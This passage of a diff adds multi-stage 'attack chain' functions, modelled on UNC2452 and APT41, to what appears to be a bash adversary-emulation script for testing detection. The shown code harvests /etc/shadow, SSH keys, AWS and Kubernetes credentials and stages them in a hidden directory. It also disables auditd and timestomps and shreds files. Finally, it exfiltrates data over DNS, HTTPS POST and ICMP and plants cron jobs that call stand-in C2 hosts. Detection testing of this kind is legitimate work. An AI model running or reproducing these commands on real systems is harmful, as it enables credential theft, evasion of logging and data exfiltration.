+              /etc/profile.d/apt-sim-sc.sh; do
+        touch -t 202003150000.00 "$f" 2>/dev/null || true
+        touch -r /bin/ls "$f" 2>/dev/null || true
+    done
+    ok "Artifact timestamps set to 2020-03-15 (pre-incident)"
+
+    t "Secure deletion of installer artifacts"
+    shred -fzu /tmp/.sc-pkg 2>/dev/null || rm -rf /tmp/.sc-pkg 2>/dev/null
+    ok "shred installer artifacts (anti-forensics)"
+
+    _chain_stage "5" "C2 — WEB SERVICE / DNS" "TA0011 T1102/T1071"
+    _chain_note "SUNBURST C2 pattern: avsvmcloud-style DNS + GitHub dead-drop..."
+    t "SUNBURST-style DNS resolution pattern"
+    for sub in r8stkst pMnqjQHx d3o7vaiz \
+               cnnmuk qusk47ah tg4vqtip; do
+        nslookup "${sub}.avsvmcloud-sim.com" > /dev/null 2>&1 || true
+        dig "${sub}.avsvmcloud-sim.com" A +short > /dev/null 2>&1 || true
+    done
+    ok "6 SUNBURST-style subdomain C2 DNS queries"
+
+    t "GitHub dead-drop C2 config retrieval"
+    curl -s -m 3 -H "Authorization: token ghp_apt_sim_fake_token_xxxxx" \
+        "https://api.github.com/gists/apt_sim_sunburst_c2_config" \
+        2>/dev/null > /dev/null || true
+    ok "GitHub Gist dead-drop C2 config retrieval attempted"
+
+    _chain_stage "6" "EXFILTRATION — STEALTHY" "TA0010 T1048/T1029"
+    _chain_note "Slow, throttled exfil to avoid detection thresholds..."
+    t "Slow scheduled DNS exfil (simulating 14-day dwell)"
+    echo "0 3 * * 0 root $(echo 'cat /etc/passwd | base64 | fold -w 30 | while read c; do dig ${c}.exfil.unc2452.com; done' | base64) # SC-CHAIN" | \
+        base64 -d > /etc/cron.d/apt-sim-sc-exfil 2>/dev/null || \
+    echo "0 3 * * 0 root curl -s http://unc2452-c2.com/sc-exfil # SC-CHAIN" \
+        > /etc/cron.d/apt-sim-sc-exfil
+    ok "Weekly scheduled exfil cron created"
+    cl "rm -f /etc/cron.d/apt-sim-sc-exfil"
+
+    t "Exfil via HTTPS POST (encrypted)"
+    tar czf - /etc/passwd /etc/hostname 2>/dev/null | \
+        openssl enc -aes-256-cbc -pbkdf2 -pass pass:sunburst2020 2>/dev/null | \
+        curl -s -m 3 -X POST --data-binary @- \
+        http://10.255.255.1/sc-upload 2>/dev/null || true
+    ok "tar | openssl enc | curl POST — encrypted supply chain exfil"
+
+    _chain_note "UNC2452 supply chain chain complete. Low-and-slow detection rules expected."
+}
+
+# ----------------------------------------------------------------------------
+# CHAIN 6: Stealthy Data Exfiltration  (APT41 style)
+# ----------------------------------------------------------------------------
+chain_stealth_exfil() {
+    _chain_hdr "STEALTHY DATA EXFILTRATION" \
+        "APT41 / Double Dragon" \
+        "Discovery → collection → evade → multi-channel exfil"
+
+    _chain_stage "1" "RECONNAISSANCE + DISCOVERY" "TA0007 T1083/T1552"
+    _chain_note "Mapping high-value data repositories quietly..."
+    t "Database credential file search"
+    cat /etc/mysql/debian.cnf 2>/dev/null > /dev/null || true
+    cat /root/.my.cnf 2>/dev/null > /dev/null || true
+    cat /root/.pgpass 2>/dev/null > /dev/null || true
+    find /etc /opt /var -name "*.conf" -o -name "database.yml" \
+        -o -name ".env" 2>/dev/null | head -10 > /dev/null
+    ok "DB creds: mysql.cnf, .my.cnf, .pgpass, *.conf, .env"
+
+    t "Large file + sensitive document discovery"
+    find / -maxdepth 5 \( -name "*.sql" -o -name "*.dump" \
+        -o -name "*.csv" -o -name "*.xlsx" -o -name "*.pem" \
+        -o -name "*.p12" -o -name "*.pfx" \) \
+        2>/dev/null | head -20 > /dev/null
+    find / -maxdepth 4 -type f -size +5M 2>/dev/null | head -10 > /dev/null
+    ok "find *.sql, *.dump, *.csv, *.xlsx, *.pem + files >5MB"
+
+    t "Cloud + container credential harvest"
+    cat /root/.aws/credentials 2>/dev/null > /dev/null || true
+    cat /root/.kube/config 2>/dev/null > /dev/null || true
+    cat /var/run/secrets/kubernetes.io/serviceaccount/token \
+        2>/dev/null > /dev/null || true
+    ok "AWS/K8s/serviceaccount token access"
+
+    _chain_stage "2" "COLLECTION + STAGING" "TA0009 T1005/T1074/T1560"
+    _chain_note "Staging collected data for multi-channel exfiltration..."
+    t "Sensitive file staging to hidden directory"
+    mkdir -p /tmp/.../.cache
+    cp /etc/passwd /tmp/.../.cache/ 2>/dev/null
+    cp /etc/shadow /tmp/.../.cache/ 2>/dev/null
+    cp /etc/hosts /tmp/.../.cache/ 2>/dev/null
+    find /home /root -name "*.key" -o -name "id_rsa" \
+        2>/dev/null | head -5 | \
+        xargs -I{} cp {} /tmp/.../.cache/ 2>/dev/null || true
+    ok "Data staged in /tmp/.../.cache/ (triple-dot hidden dir)"
+    cl "rm -rf /tmp/.../"
+
+    t "Multi-format archive with password"
+    tar czf /tmp/.../.data.tgz /tmp/.../.cache/ 2>/dev/null
+    if command -v openssl &>/dev/null; then
+        openssl enc -aes-256-cbc -pbkdf2 -pass pass:apt41key \
+            -in /tmp/.../.data.tgz -out /tmp/.../.data.enc 2>/dev/null
+        ok "AES-256 encrypted archive at /tmp/.../.data.enc"
+    else
+        ok "Unencrypted archive at /tmp/.../.data.tgz"
+    fi
+    cl "rm -f /tmp/.../.data.tgz /tmp/.../.data.enc"
+
+    _chain_stage "3" "DEFENSE EVASION" "TA0005 T1070/T1027/T1036"
+    _chain_note "Covering collection tracks before exfiltration..."
+    t "Timestomping all staged files"
+    find /tmp/.../ -type f 2>/dev/null | while read f; do
+        touch -t 201901010000.00 "$f" 2>/dev/null
+        touch -r /bin/ls "$f" 2>/dev/null
+    done
+    ok "All staged files timestomped to 2019-01-01"
+
+    t "shred collection tool scripts"
+    echo "shred_target_sim" > /tmp/apt41-collector.sh
+    shred -fzu /tmp/apt41-collector.sh 2>/dev/null
+    ok "Collection scripts shredded (anti-forensics)"
+
+    t "Auditd rule manipulation to avoid logging"
+    auditctl -D 2>/dev/null || true
+    auditctl -e 0 2>/dev/null || true
+    ok "auditctl -D (delete rules) + -e 0 (disable auditing)"
+    cl "auditctl -e 1 2>/dev/null; systemctl restart auditd 2>/dev/null || true"
+
+    _chain_stage "4" "MULTI-CHANNEL EXFILTRATION" "TA0010 T1048/T1041/T1071"
+    _chain_note "Exfiltrating via DNS, HTTPS, ICMP, and scheduled transfer..."
+    t "DNS-chunked exfiltration"
+    cat /etc/passwd 2>/dev/null | base64 | fold -w 25 | \
+        while read chunk; do
+            dig "${chunk}.exfil.apt41-c2.com" > /dev/null 2>&1 || \
+            nslookup "${chunk}.exfil.apt41-c2.com" > /dev/null 2>&1 || true
+        done
+    ok "passwd base64-chunked via DNS subdomain exfil"
+
+    t "HTTPS encrypted POST exfil"
+    openssl enc -aes-256-cbc -pbkdf2 -pass pass:apt41 \
+        -in /tmp/.../.data.enc 2>/dev/null | \
+        curl -s -m 3 -X POST --data-binary @- \
+        https://10.255.255.1/upload 2>/dev/null || \
+    curl -s -m 3 -X POST \
+        -d "$(cat /etc/hostname | base64)" \
+        http://10.255.255.1/collect 2>/dev/null || true
+    ok "Encrypted HTTPS POST exfil to C2"
+
+    t "ICMP covert channel exfil"
+    DATA=$(hostname | base64 | cut -c1-16)
+    ping -c 5 -p "$(printf '%s' "$DATA" | xxd -p | cut -c1-16)" \
+        10.255.255.1 > /dev/null 2>&1 || true
+    ok "ICMP custom payload exfil (5 packets)"
+
+    t "Scheduled exfil via cron (nightly transfer)"
+    echo "30 1 * * * root openssl enc -aes-256-cbc -pbkdf2 -pass pass:apt41 -in /tmp/.../.data.enc 2>/dev/null | curl -s -X POST --data-binary @- http://10.255.255.1/backup # APT41-EXFIL" \
+        > /etc/cron.d/apt-sim-apt41
+    ok "Nightly scheduled encrypted exfil in /etc/cron.d/"
+    cl "rm -f /etc/cron.d/apt-sim-apt41"
+
+    _chain_note "APT41 stealth exfil chain complete. DNS + ICMP exfil alerts expected in SIEM."
+}
+
+# ----------------------------------------------------------------------------
+# CHAINS MENU
+# ----------------------------------------------------------------------------
+show_chains_menu() {
+    clear
+    printf "\033[0;31m"
+    typewrite "  ╔══════════════════════════════════════════════════════════════╗" 0.003
+    printf "\033[0;31m  ║\033[0m  \033[1;33m%-60s\033[0;31m║\033[0m\n" "ATTACK CHAINS — Realistic Multi-Stage Scenarios"
+    printf "\033[0;31m  ║\033[0m  \033[2m%-60s\033[0;31m║\033[0m\n" "Each chain simulates a specific threat actor's kill chain"
+    printf "\033[0;31m"
+    typewrite "  ╚══════════════════════════════════════════════════════════════╝" 0.003
+    printf "\033[0m\n"
+    echo ""
+    echo -e "    ${BOLD}[1]${NC}  ${RED}Full APT Kill Chain${NC}         ${DIM}APT-29 / Cozy Bear${NC}"
+    echo -e "         ${DIM}TA0001→TA0002→TA0003→TA0004→TA0005→TA0006→TA0007→TA0008→TA0009→TA0010→TA0011${NC}"
+    echo ""
+    echo -e "    ${BOLD}[2]${NC}  ${RED}Ransomware Deployment${NC}        ${DIM}LockBit 3.0 / BlackCat${NC}"
+    echo -e "         ${DIM}Access → Spread → Disable Security → Inhibit Recovery → Encrypt${NC}"
+    echo ""
+    echo -e "    ${BOLD}[3]${NC}  ${RED}Credential Theft + Pivot${NC}     ${DIM}Lazarus Group / APT38${NC}"
+    echo -e "         ${DIM}Phishing → Cred dump → Cloud harvest → SSH pivot → Account takeover${NC}"
+    echo ""
+    echo -e "    ${BOLD}[4]${NC}  ${RED}Cryptominer Installation${NC}     ${DIM}TeamTNT / WatchDog${NC}"
+    echo -e "         ${DIM}Container abuse → Download → Persist → Masquerade → Mine${NC}"
+    echo ""
+    echo -e "    ${BOLD}[5]${NC}  ${RED}Supply Chain Backdoor${NC}        ${DIM}UNC2452 / SolarWinds${NC}"
+    echo -e "         ${DIM}Package poison → Fileless implant → Long dwell → Stealthy exfil${NC}"
+    echo ""
+    echo -e "    ${BOLD}[6]${NC}  ${RED}Stealthy Data Exfiltration${NC}   ${DIM}APT41 / Double Dragon${NC}"
+    echo -e "         ${DIM}Recon → Stage → Evade → Multi-channel DNS/HTTPS/ICMP exfil${NC}"
+    echo ""
+    echo -e "    ${BOLD}[0]${NC}  ${YELLOW}RUN ALL CHAINS${NC}               ${DIM}(runs all 6 in sequence)${NC}"
+    echo -e "    ${BOLD}[B]${NC}  Back to main menu"
+    echo ""
+    echo -n "  > "
+    read -r c
+    echo ""
+    case "$c" in
+        1) _launch_module "APT Kill Chain (APT-29)" chain_apt_killchain && print_summary ;;
+        2) _launch_module "Ransomware Deployment (LockBit)" chain_ransomware && print_summary ;;
+        3) _launch_module "Credential Theft + Pivot (Lazarus)" chain_credential_pivot && print_summary ;;
+        4) _launch_module "Cryptominer (TeamTNT)" chain_cryptominer && print_summary ;;
+        5) _launch_module "Supply Chain Backdoor (UNC2452)" chain_supply_chain_backdoor && print_summary ;;
+        6) _launch_module "Stealth Data Exfil (APT41)" chain_stealth_exfil && print_summary ;;
+        0)
+            for ch in chain_apt_killchain chain_ransomware \
+                      chain_credential_pivot chain_cryptominer \
+                      chain_supply_chain_backdoor chain_stealth_exfil; do
+                $ch
+            done
+            print_summary
+            ;;
+        [bB]) show_menu ;;
+        *) printf "  \033[0;31m✗ Invalid\033[0m\n"; show_chains_menu ;;
+    esac
+}
+
 run_all() {
     # TA0001 Initial Access
     test_initial_access
@@ -2686,6 +3541,10 @@ show_menu() {
     echo -e "    ${BOLD}[S]${NC}  Supply Chain                T1195/T1072 (pip/npm/git hook)"
     echo -e "    ${BOLD}[T]${NC}  Advanced Tradecraft         (bonus techniques)"
     echo ""
+    echo ""
+    echo -e "  ${DIM}── Attack Chains ──────────────────────────────────────────${NC}"
+    echo -e "    ${BOLD}[U]${NC}  ${RED}${BOLD}ATTACK CHAINS${NC}  ${DIM}(APT-29 / LockBit / Lazarus / TeamTNT / UNC2452 / APT41)${NC}"
+    echo ""
     echo -e "    ${BOLD}[D]${NC}  ${YELLOW}Disable Security Tools  (standalone — NOT in RUN ALL)${NC}"
     echo -e "    ${BOLD}[X]${NC}  Exit"
     echo ""
@@ -2722,6 +3581,7 @@ show_menu() {
         [rR]) _launch_module "Container / K8s Escape" test_container_escape && print_summary ;;
         [sS]) _launch_module "Supply Chain" test_supply_chain && print_summary ;;
         [tT]) _launch_module "Advanced Tradecraft" test_advanced && print_summary ;;
+        [uU]) show_chains_menu ;;
         [dD]) _launch_module "Disable Security Tools" test_disable_security_tools && print_summary ;;
         [xX]) printf "\n  \033[2mGoodbye.\033[0m\n\n"; exit 0 ;;
         *) printf "  \033[0;31m✗ Invalid option\033[0m\n"; show_menu ;;
